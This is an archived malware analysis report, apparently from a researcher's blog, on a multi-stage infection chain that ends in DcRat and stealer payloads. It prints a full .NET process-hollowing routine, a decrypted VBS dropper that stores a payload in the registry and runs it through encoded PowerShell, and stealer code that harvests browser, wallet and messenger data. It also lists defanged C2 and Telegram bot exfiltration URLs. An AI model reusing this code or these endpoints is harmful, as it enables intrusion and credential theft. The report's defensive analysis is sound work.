{
    "id": "73c061e0-4d71-4623-a325-e2975cf26822",
    "created_at": "2023-05-06T02:08:12.243442Z",
    "updated_at": "2025-03-27T02:09:29.210731Z",
    "deleted_at": null,
    "sha1_hash": "63655a90a4bbe1927c54f548b5c95c86e69adb64",
    "title": "2023-04-08 - [QuickNote] Uncovering Suspected Malware Distributed By Individuals from Vietnam",
    "authors": "",
    "file_creation_date": "2023-05-05T01:50:36Z",
    "file_modification_date": "2023-05-05T01:50:36Z",
    "file_size": 1694536,
    "plain_text": "# [QuickNote] Uncovering Suspected Malware Distributed By Individuals from Vietnam\n\n**[kienmanowar.wordpress.com/2023/04/08/quicknote-uncovering-suspected-malware-distributed-by-individuals-from-vietnam/](https://kienmanowar.wordpress.com/2023/04/08/quicknote-uncovering-suspected-malware-distributed-by-individuals-from-vietnam/)**\n\nApril 8, 2023\n\n## Recently, I received a hash of sample from a friend on Twitter. Upon further investigation, I noticed that the code was likely created by someone in Vietnam. As a result, I decided to analyze and share it with others.\n\n Malicious code can be incredibly dangerous and harmful to computer systems, and it’s important to be able to recognize and understand it. By analyzing the code, we can determine its purpose and potential impact, as well as develop strategies to protect against similar threats in the future.\n\n Given the potential risks of this particular code, I felt it was important to share my findings with others in the security community. By working together and sharing information, we can all help to keep our systems and networks safe from harm. I hope that someone will take the time to investigate deeper and uncover who is behind this malware. It is crucial to identify the culprit and hold them accountable for their actions.\n\n Sample hash: 15940f1c8f7e5e79a78c8fad9dc54a8cb9b399d60fb80f6dec2f25870d64dcc1\n\n Through VT’s Telemetry, this sample was submitted from Vietnam. It’s possible that the victim submitted it to VT or the author themselves submitted it to see if it would be detected by antivirus companies.\n\n\n-----\n\n## Below is a diagram illustrating the execution flow of the malware.\n\n 1. Stage 1\n\n The compressed file named “fvia.zip” contains a shortcut file called “fvia.lnk“. If the user double- clicks on this file, it will execute a Powershell script. This script is designed to download a payload from the address “hxxps[://]raw[.]githubusercontent[.]com/vltpro/FVIATOOL/main/iXPWQcqYZM[.]exe” and save it as “%APPDATA%\\svchost.exe“. Finally, the downloaded payload will be executed.\n\n 2. Stage 2\n\n The downloaded file is a .NET payload. Upon a quick inspection of its information, several indicators are present, such as:\n\n\n-----\n\n## Upon analyzing the code of this payload, it has been determined that it will decrypt into two PE files. The first PE file is a .NET payload, while the second PE file is coded in C. After obtaining information about the method within the decoded .NET payload, it can call this method with two parameters: {\n```\n\"C:\\Windows\\System32\\schtasks.exe\", obj2 }. Here, obj2refers to the second PE file.\n\n Quickly check the basic information of these payloads as the following: 1 payload (.Net payload)st (a1cc33df5af690050e7e76ca40668f68ea0801df2569ac7404762f101a065bb6)\n\n```\n\n-----\n\n## 2nd payload (7c82507412b690ba888f06d3fb9b2d110e2a346da3322de9468bf46ee7086e93)\n\n 3. Stage 3\n\n After performing deobfuscation and field renaming, the .NET payload code simply utilizes the Process Injection technique. It spawns the schtasks.exe process and injects Payload 2 into this process, hiding the malicious code under the guise of the schtasks.exe process to deceive the victim.\n\n\n-----\n\n```\npublic static void NhXNBbtWQXBcChtcTXUAqcqPi(string path, byte[] BMzkoPmmQXLGAmGCzcVuwiJWE)\n\n          {\n\n              for (int i = 0; i < 5; i++)\n\n              {\n\n                   int num = 0;\n\n                   nQQijGzABIgLBOLrpHqHkkoiD.Struct1 @struct =\ndefault(nQQijGzABIgLBOLrpHqHkkoiD.Struct1);\n\n                   nQQijGzABIgLBOLrpHqHkkoiD.Struct0 struct2 =\ndefault(nQQijGzABIgLBOLrpHqHkkoiD.Struct0);\n\n                   @struct.uint_0 =\nConvert.ToUInt32(Marshal.SizeOf(typeof(nQQijGzABIgLBOLrpHqHkkoiD.Struct1)));\n\n                   try\n\n                   {\n\n                        if (!nQQijGzABIgLBOLrpHqHkkoiD.fn_CreateProcessA(path,\nstring.Empty, IntPtr.Zero, IntPtr.Zero, false, 134217732U, IntPtr.Zero, null, ref @struct, ref\nstruct2))\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        int num2 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, 60);\n\n                        int num3 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num2 + 52);\n\n                        int[] array = new int[179];\n\n                        array[0] = 65538;\n\n                        if (IntPtr.Size == 4)\n\n                        {\n\n                             if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_GetThreadContext(struct2.intptr_1, array))\n\n                             {\n\n                                  throw new Exception();\n\n                             }\n\n                        }\n\n                        else if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_Wow64GetTheadContext(struct2.intptr_1, array))\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        int num4 = array[41];\n\n                        int num5 = 0;\n\n                        if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_ReadProcessMemory(struct2.intptr_0, num4 + 8, ref num5, 4, ref\nnum))\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        if (num3 == num5 &&\nnQQijGzABIgLBOLrpHqHkkoiD.fn_ZwUnmapViewOfSection(struct2.intptr_0, num5) != 0)\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        int num6 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num2 + 80);\n\n                        int num7 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num2 + 84);\n\n                        bool flag = false;\n\n                        int num8 =\nnQQijGzABIgLBOLrpHqHkkoiD.fn VirtualAllocEx(struct2.intptr 0, num3, num6, 12288, 64);\n\n```\n\n-----\n\n```\n                        if (num8  0)\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_WriteProcessMemory(struct2.intptr_0, num8,\nBMzkoPmmQXLGAmGCzcVuwiJWE, num7, ref num))\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        int num9 = num2 + 248;\n\n                        short num10 =\nBitConverter.ToInt16(BMzkoPmmQXLGAmGCzcVuwiJWE, num2 + 6);\n\n                        for (int j = 0; j < (int)num10; j++)\n\n                        {\n\n                             int num11 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num9 + 12);\n\n                             int num12 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num9 + 16);\n\n                             int num13 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num9 + 20);\n\n                             if (num12 != 0)\n\n                             {\n\n                                  byte[] array2 = new byte[num12];\n\nBuffer.BlockCopy(BMzkoPmmQXLGAmGCzcVuwiJWE, num13, array2, 0, array2.Length);\n\n                                  if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_WriteProcessMemory(struct2.intptr_0, num8 + num11, array2,\narray2.Length, ref num))\n\n                                  {\n\n                                      throw new Exception();\n\n                                  }\n\n                             }\n\n                             num9 += 40;\n\n                        }\n\n                        byte[] bytes = BitConverter.GetBytes(num8);\n\n                        if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_WriteProcessMemory(struct2.intptr_0, num4 + 8, bytes, 4, ref\nnum))\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        int num14 =\nBitConverter.ToInt32(BMzkoPmmQXLGAmGCzcVuwiJWE, num2 + 40);\n\n                        if (flag)\n\n                        {\n\n                             num8 = num3;\n\n                        }\n\n                        array[44] = num8 + num14;\n\n                        if (IntPtr.Size == 4)\n\n                        {\n\n                             if\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_SetTheadContext(struct2.intptr_1, array))\n\n                             {\n\n                                  throw new Exception();\n\n                             }\n\n                        }\n\n                        else if\n\n```\n\n-----\n\n```\n(!nQQijGzABIgLBOLrpHqHkkoiD.fn_Wow64SetTheadContext(struct2.intptr_1, array))\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        if\n(nQQijGzABIgLBOLrpHqHkkoiD.fn_ResumeThread(struct2.intptr_1) == -1)\n\n                        {\n\n                             throw new Exception();\n\n                        }\n\n                        break;\n\n                   }\n\n                   catch\n\n                   {\n\nProcess.GetProcessById(Convert.ToInt32(struct2.uint_0)).Kill();\n\n                   }\n\n              }\n\n          }\n\n## Using IDA to analyze payload 2, we quickly found the function that performs the main task of the malware as follows:\n\n Decrypt strings. Writing the decrypted content of the script into a file and executing that file.\n\n```\n\n-----\n\n```\nint __stdcall mw_decrypt_and_exec_vbs_file()\n\n{\n\n // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-\"+\" TO EXPAND]\n\n sleep(0);\n\n lpOperation = mw_decrypt_string(encString, 4);\n\n lpFile = mw_decrypt_string(byte_402026, 0xA);\n\n v0 = mw_decrypt_string(byte_402031, 0x12E);\n\n ShellExecuteA(0, lpOperation, lpFile, v0, 0, 0);\n\n encString_arr[0] = &byte_402160;\n\n encString_arr[1] = &byte_40216C;\n\n encString_arr[2] = &byte_402178;\n\n encString_arr[3] = &byte_41240D;\n\n encString_arr[4] = &byte_412415;\n\n encString_arr[5] = &byte_412421;\n\n encString_len[0] = 0xB;\n\n encString_len[1] = 0xB;\n\n encString_len[2] = 0x10294;\n\n encString_len[3] = 1;\n\n encString_len[4] = 7;\n\n encString_len[5] = 0xB;\n\n encString_len[6] = 0x10294;\n\n encString_len[7] = 1;\n\n for ( i = 0; i < 2; ++i )\n\n {\n\n  if ( !strcmp(encString_arr[3 * i], g_str_pattern) )\n\n  {\n\n   v1 = mw_decrypt_string(encString_arr[3 * i + 1], encString_len[4 * i + 1]);\n\n   strcpy(vbs_file_full_path, v1);\n\n  }\n\n  else\n\n  {\n\n   str_special_folder_name = mw_decrypt_string(encString_arr[3 * i], encString_len[4 * i]);\n\n   special_folder_path = getenv(str_special_folder_name);\n\n   file_name = mw_decrypt_string(encString_arr[3 * i + 1], encString_len[4 * i + 1]);\n\n   sprintf(vbs_file_full_path, \"%s\\\\%s\", special_folder_path, file_name);\n\n  }\n\n  fp = fopen(vbs_file_full_path, \"wb\");\n\n  decrypted_file_content = mw_decrypt_string(encString_arr[3 * i + 2], encString_len[4 * i +\n2]);\n\n  fwrite(decrypted_file_content, encString_len[4 * i + 2], 1u, fp);\n\n  fclose(fp);\n\n  if ( encString_len[4 * i + 3] )\n\n  {\n\n   lpOperation = mw_decrypt_string(byte_4226D1, 4);\n\n   ShellExecuteA(0, lpOperation, vbs_file_full_path, 0, 0, 0xA);\n\n  }\n\n }\n\n return 0;\n\n}\n\n## The pseudocode of the string decryption function is shown below.\n\n```\n\n-----\n\n## Based on this decryption code, we can write an IDApython script to automatically decrypt strings. The result of executing the script is as follows:\n\n Below is a list of all the decoded strings:\n\n\n-----\n\n```\nTrying to decode string at address 4010B0\n\nEncoded string: b'A+\\x0b\\x02'\n\nDecoded string: open\n\n-----------------------------\nTrying to decode string at address 4010C7\n\nEncoded string: b'^4\\x19\\t\\x04RQ\\x17\\x0fP'\n\nDecoded string: powershell\n\n-----------------------------\nTrying to decode string at address 4010DE\n\nEncoded string: b'\\x03\\x1e\\x00\\x0f\\x19E\\\\\\x16 S\\x08Z\\x13W\\x14QR#\\x1a-W\\x1ea\\ri\\nP\\x1d\\x1b\\x1d:o\\x0b\\t.4`~#\"f$v\\x06x5A1\\x10\\x1a.l\\x1en#i2f\\x1d\\x1e-\\x19\"o8\\t.\\x1a`~F\"e\\x12u\\x1ex301#\\x1aW\\x1ea\\x1di2@\\x1d\\x04-\\x1d:o\\x0b\\t-\\x11`zB\"n4uFx7<1\\x11\\x1a.\\x0c\\x1en\\'i\\tf\\x1d\\x05\\x19Co\\x0e/.\\x1e`q#\"]$v\\x15x5018\\x1a-V\\x1ea?i\\nP\\x1dA\\x1a\\x18o\\r?.\\x0c`~\\'\"_\\x02u#x881\\x11,.P\\x1ea\\x01i\\nv\\x1d\\x1f\\x1d\\x00o\\x11/.\\x1a`~F\"X\\x02vDx6<1\\x16\\n.G\\x1en;i2f\\x1d\\x07-\\x1b&o8\\t.\\x06`q+\"f4v\\x02x301#\\x1aW\\x1en\\x05i\\x0cv\\x1d\\x19-\\x1d:o\\x0b\\t-\\x11`zB\"n\\x02u\\x04x881*,.Q\\x1ee+i8v\\x1e\\x19-\\x166o?\n\\x19.E`z?\"l\\x02vO\\x1b'\n\nDecoded string: -EncodedCommand\n\"PAAjAGgAbgBhACMAPgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAAPAAjAGwAZwBwACMAPgAgAC0ARQB4AGM\n\n-----------------------------\nTrying to decode string at address 40122E\n\nCan not retrieve address of encrypted string!\n\n-----------------------------\nTrying to decode string at address 401272\n\nCan not retrieve address of encrypted string!\n\n-----------------------------\nTrying to decode string at address 4012B3\n\nCan not retrieve address of encrypted string!\n\n-----------------------------\nTrying to decode string at address 40131D\n\nCan not retrieve address of encrypted string!\n\n-----------------------------\nTrying to decode string at address 401386\n\nEncoded string: b'A+\\x0b\\x02'\n\nDecoded string: open\n\n-----------------------------\n************************\n\nTotal decoding calls: 8\n\nSuccessful decoding calls: 4\n\n----Decode strings at the above unreachable addresses---\nDecode string at address 402160\n\nDecoded string: UserProfile\n\nDecode string at address 40216C\n\nDecoded string: svchost.vbs\n\nDecode string at address 402178\n\nDecoded string: On Error Resume Next\n\n'Dim suXjung\n\n'suXjung = MsgBox (\"\",, \"\")\n\nFor x = 0 To 5\n\n   WScript.Sleep(1000)\n\n  Next\n\nAzwe25wgvn5g0=\"==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n--Stripped--\"\n\nAzwe25wgvn5g16214=\"gSAQEAJBQSAYEADBwZAYFAPBwKA0GAhBQWAIDA1BAdAgEArAgVAADAFBAOAUGAwBQcAcHACBwbAYH\n--Stripped---\"\n\n```\n\n-----\n\n```\nAzwe25wgvn5g32428=\"sAwmBMOBsDwiBMuAXCwkBAeBjAwoBMMByDwmBMMBsDwiBMsAXCwkBAsAXCwkBAqAXCwkBAoAXCwkB\n ---Stripped ----\"\n\nAzwe25wgvn5g48642=\"AAJtnAAAAAmhDAAAgWAAAAJBAAAgDAAAwaAAAARAAAAUAAAAgIAAAAHUUWaYgCEAAAKtnARAAAiAA\n--Stripped--AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT\"\n\nAlsddeyb1xim = Azwe25wgvn5g0 + Azwe25wgvn5g16214 + Azwe25wgvn5g32428 + Azwe25wgvn5g48642\n\nSet obj = CreateObject(\"Wscript.Shell\")\n\nSet fso=CreateObject(\"Scripting.FileSystemObject\")\n\n' startPath = obj.SpecialFolders(\"Startup\") & \"\\Payload.vbs\"\n\n' currentPath = fso.GetAbsolutePathName(wscript.scriptfullname)\n\nReg = \"HKCU\\SOFTWARE\\Payload\\Payload\"\n\nif obj.RegRead(Reg) <> Alsddeyb1xim then\n\nobj.RegWrite Reg, Alsddeyb1xim\n\nend if\n\nPPSS = \"Powershell -noexit -exec bypass -window 1 -enc\nIAAkAHQAZQB4AHQAIAA9ACAAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsAQwBVADoAXABTAG8A\n\n'PSPS = \"Powershell -exec bypass -window 1 #startup\"\n\nobj.Run PSPS, 0, False\n\nobj.Run PPSS, 0, False\n\nDecode string at address 41240D\n\nDecoded string: AppData\n\nDecode string at address 412415\n\nDecoded string: svchost.vbs\n\nDecode string at address 412421\n\nDecoded string: On Error Resume Next\n\n'Dim suXjung\n\n'suXjung = MsgBox (\"\",, \"\")\n\nFor x = 0 To 5\n\n   WScript.Sleep(1000)\n\n  Next\n\nAzwe25wgvn5g0=\"==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n ---Stripped----\"\n\nAzwe25wgvn5g16214=\"gSAQEAJBQSAYEADBwZAYFAPBwKA0GAhBQWAIDA1BAdAgEArAgVAADAFBAOAUGAwBQcAcHACBwbAYH\n--Stripped---\"\n\nAzwe25wgvn5g32428=\"sAwmBMOBsDwiBMuAXCwkBAeBjAwoBMMByDwmBMMBsDwiBMsAXCwkBAsAXCwkBAqAXCwkBAoAXCwkB\n ---Stripped---\"\n\nAzwe25wgvn5g48642=\"AAJtnAAAAAmhDAAAgWAAAAJBAAAgDAAAwaAAAARAAAAUAAAAgIAAAAHUUWaYgCEAAAKtnARAAAiAA\n-- Stripped --AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT\"\n\nAlsddeyb1xim = Azwe25wgvn5g0 + Azwe25wgvn5g16214 + Azwe25wgvn5g32428 + Azwe25wgvn5g48642\n\nSet obj = CreateObject(\"Wscript.Shell\")\n\nSet fso=CreateObject(\"Scripting.FileSystemObject\")\n\n' startPath = obj.SpecialFolders(\"Startup\") & \"\\Payload.vbs\"\n\n```\n\n-----\n\n```\n currentPath fso.GetAbsolutePathName(wscript.scriptfullname)\n\nReg = \"HKCU\\SOFTWARE\\Payload\\Payload\"\n\nif obj.RegRead(Reg) <> Alsddeyb1xim then\n\nobj.RegWrite Reg, Alsddeyb1xim\n\nend if\n\nPPSS = \"Powershell -noexit -exec bypass -window 1 -enc\nIAAkAHQAZQB4AHQAIAA9ACAAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIABIAEsAQwBVADoAXABTAG8A\n\n'PSPS = \"Powershell -exec bypass -window 1 #startup\"\n\nobj.Run PSPS, 0, False\n\nobj.Run PPSS, 0, False\n\nDone!!!\n\n## 4. Stage 4\n\n The svchost.vbs script performs some actions. Upon analysis, it was discovered that this script is designed to save an encoded payload in Base64 format into the registry key “HKCU\\SOFTWARE\\Payload\\Payload“.\n\n After saving the payload in the registry, the script then uses a PowerShell script to read the payload from the registry key mentioned above. The PowerShell script decodes the payload using Base64 and executes it.\n\n Based on the PowerShell code snippet above, it can be seen that this payload is a continuation of a .NET payload.\n\n 5. Stage 5\n\n The final payload has an InternalName: Client.exe, and operates as a client, connecting to C2 to download and execute the payload that has been downloaded. Its basic tasks are described below, and the corresponding functions will be performed based on the decryption configuration.\n\n```\n\n-----\n\n## In order to execute its malicious actions, the malware needs to decode its configuration information. Based on the information from Client.Settings.Server_Certificate {CN=DcRat\n```\n  [Issuer] C=CN, L=SH, O=DcRat By qwqdanchun, OU=qwqdanchun..}, it is likely that this\n\n payload is based on the source code of hxxps://github[.]com/qwqdanchun/DcRat.\n\n Once this is done, the malware will perform simple check to ensure that it is not running on a virtual machine. It does this by checking the computer’s cache memory, and if no cache memory is detected, it will terminate the process immediately, assuming that it is running on a virtual machine. To ensure that only one instance of the malware is executed, a Mutex is created. Additionally, the AntiProcess function is called to scan all running processes on the system and terminate any process that matches a list of predetermined names.\n\n Taskmgr.exe\n\n ProcessHacker.exe\n\n procexp.exe\n\n MSASCui.exe\n\n MsMpEng.exe\n\n MpUXSrv.exe\n\n MpCmdRun.exe\n\n NisSrv.exe\n\n UserAccountControlSettings.exe\n\n taskkill.exe\n\n To ensure persistence, the malware installs itself by setting up a Run key or Scheduler task.\n\n```\n\n-----\n\n## It also bypasses the AMSI (Anti-Malware Scan Interface) to avoid detection by antivirus software. The malware establishes a connection to the pastebin website (hxxps://pastebin[.]com/raw/gdYYU7gi) to obtain the IP address and port number of the C2 (Command and Control) server. It then initiates a connection to the C2 server at the specified IP address and port (171[.]247.25.94:5656).\n\n If the connection to the C2 server is successful, the malware will authenticate itself as a client and begin collecting information about the victim’s computer to send to the C2 server. The malware will then download additional payloads from the C2 server to carry out further malicious actions.\n\n At the time of analysis, the C2 address is no longer connected, so the analysis will stop at this point.\n\n I spent time quickly examining another file that was also introduced and provided by the threat actor on GitHub: hxxps://github[.]com/vltpro/FVIATOOL/blob/main/fvia.rar. This compressed file contains two executable files. After extracting them, I ran the update.exe file. Its execution process will perform PowerShell scripts with two purposes. The first is to display an error message form with an OK button, and the second is to add some paths (“$env:UserProfile“ và “$env:SystemDrive“) to Windows Defender’s exclusion list. This will allow files within these paths to avoid being scanned by the\n\n\n-----\n\n## Windows Defender antivirus software, enabling attackers to perform malicious activities stealthily without being detected. The update.exe process will then decode, drop two files\n```\n%LocalAppData%\\File1.exe and %AppData%\\ok.exe, and execute them.\n\n Quickly examine the code of the file ok.exe (80b231aeb2e6026767e6edd22fa0b073bd805f59aa6eaed5635976a46c10e3cd). The payload code is similar to the payload analyzed in Stage 5 above. It also connects to “hxxps[://]pastebin[.]com/raw/gdYYU7gi” to retrieve the C2 address, however, the information of the Client.Settings.Server_Certificate has been partially removed, including some important information.\n\n Continuing on, upon a quick analysis of the code for File1.exe\n (ddf0e4ffcdcf120d591a1ea82e58f21936d763f90dc3b33a4c4750fd1496652a), I noticed that it bears a strong resemblance to the AsyncRAT malware (for example, the name of the Mutex and the structure\n\n```\n\n-----\n\n## of the decoded configuration). However, based on information from the Certificate ({[Subject]\n\n### CN=WorldWind Stealer [Issuer] CN=WorldWind Stealer..} it is possible that it is\n```\nhxxps://github[.]com/Leecher21/WorldWind-Stealer.\n\n```\n\n-----\n\n## Or it is possible that this payload is based on the code from “hxxps://github[.]com/LimerBoy/StormKitty“\n\n There are various methods to collect information from a victim’s computer, depending on the situation and the type of data needed. The following is the method that this malware uses to collect information on the victim’s machine:\n\n\n-----\n\n```\npublic static bool smethod_0(string string_0)\n\n          {\n\n              try\n\n              {\n\n                   Class19.smethod_4(string_0 + \"\\\\Grabber\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class47.smethod_0(string_0 + \"\\\\Browsers\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class41.smethod_0(string_0 + \"\\\\Browsers\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class35.smethod_0(string_0 + \"\\\\Browsers\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class24.smethod_0(Class24.smethod_3(), string_0 +\n\"\\\\Messenger\\\\Discord\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class25.smethod_0(string_0 + \"\\\\Messenger\\\\Pidgin\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class26.smethod_1(string_0 + \"\\\\Messenger\\\\Telegram\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class28.smethod_0(string_0 + \"\\\\Gaming\\\\Steam\");\n                   Class29.smethod_0(string_0 + \"\\\\Gaming\\\\Uplay\");\n              }\n\n              catch\n\n```\n\n-----\n\n```\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class27.smethod_5(string_0 + \"\\\\Gaming\\\\Minecraft\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class12.smethod_0(string_0 + \"\\\\Wallets\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class11.smethod_3(Class11.smethod_1(), string_0 +\n\"\\\\FileZilla\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class15.smethod_0(string_0 + \"\\\\VPN\\\\ProtonVPN\");\n\n                   Class14.smethod_0(string_0 + \"\\\\VPN\\\\OpenVPN\");\n\n                   Class13.smethod_1(string_0 + \"\\\\VPN\\\\NordVPN\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Directory.CreateDirectory(string_0 + \"\\\\Directories\");\n\n                   Class18.smethod_2(string_0 + \"\\\\Directories\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Directory.CreateDirectory(string_0 + \"\\\\System\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class21.smethod_0(string_0 + \"\\\\System\");\n\n                   Class16.smethod_0(string_0 + \"\\\\System\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n```\n\n-----\n\n```\n                   Class17.smethod_0(string_0 \\\\System );\n\n                   Class22.smethod_1(string_0 + \"\\\\System\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   Class23.smethod_3(string_0 + \"\\\\System\");\n\n                   Class23.smethod_2(string_0 + \"\\\\System\");\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              try\n\n              {\n\n                   File.WriteAllText(string_0 + \"\\\\System\\\\ProductKey.txt\",\nGClass12.smethod_3());\n\n              }\n\n              catch\n\n              {\n\n              }\n\n              return true;\n\n          }\n\n## Once the malware has collected this information, it sends it to the attacker’s Telegram account for further exploitation:\n\n Bonus VT Graph:\n\n```\n\n-----\n\n## IOCs:\n\n 15940f1c8f7e5e79a78c8fad9dc54a8cb9b399d60fb80f6dec2f25870d64dcc1 (zip file)\n\n 0603640f8628b4b4c8691204d833bc0b6f8f193049c5e35dc1d556376f4c1b8f (lnk file)\n\n 78a627930b04c6ff9bb4a0b5841c4c79bedee168522862e750f5608b43b907ce (payload)\n\n 972c14a244a43f498c153ae36495c51c4990f32512650dc870fe5ab6257ad2ad (vbs file)\n\n hxxps[://]raw[.]githubusercontent[.]com/vltpro/FVIATOOL/main/iXPWQcqYZM[.]exe\n\n hxxps[://]pastebin[.]com/raw/gdYYU7gi\n\n 171[.]247.25.94:5656\n\n hxxps[://]volamtuan[.]com/hd[.]lnk\n\n hxxps[://]raw[.]githubusercontent[.]com/vltpro/FVIATOOL/main/FVIATOOL[.]exe\n\n hxxps[://]github[.]com/vltpro/FVIATOOL/blob/main/cookie[.]exe\n\n hxxps[://]api[.]telegram[.]org/bot5370417334:AAEZrEauqhTNZInhZ9_- SaapQJIi0hIvjJU/sendDocument?chat_id=857408205\n\n hxxps[://]api[.]telegram[.]org/bot1119746739:AAGMhvpUjXI4CzIfizRC–VXilxnkJlhaf8/send\n\n hxxps[://]api[.]telegram[.]org/bot5418167780:AAG6XcSYhQ7qknQ8Cj1YipvMX213kbiDV7s/sendMessage? chat_id=5268900600\n\n volamtuan[.]com\n\n End.\n\n m4n0w4r\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-08 - [QuickNote] Uncovering Suspected Malware Distributed By Individuals from Vietnam.pdf"
    ],
    "report_names": [
        "2023-04-08 - [QuickNote] Uncovering Suspected Malware Distributed By Individuals from Vietnam.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1683338892,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1683251436,
    "ts_modification_date": 1683251436,
    "files": {
        "pdf": "https://archive.orkl.eu/63655a90a4bbe1927c54f548b5c95c86e69adb64.pdf",
        "text": "https://archive.orkl.eu/63655a90a4bbe1927c54f548b5c95c86e69adb64.txt",
        "img": "https://archive.orkl.eu/63655a90a4bbe1927c54f548b5c95c86e69adb64.jpg"
    }
}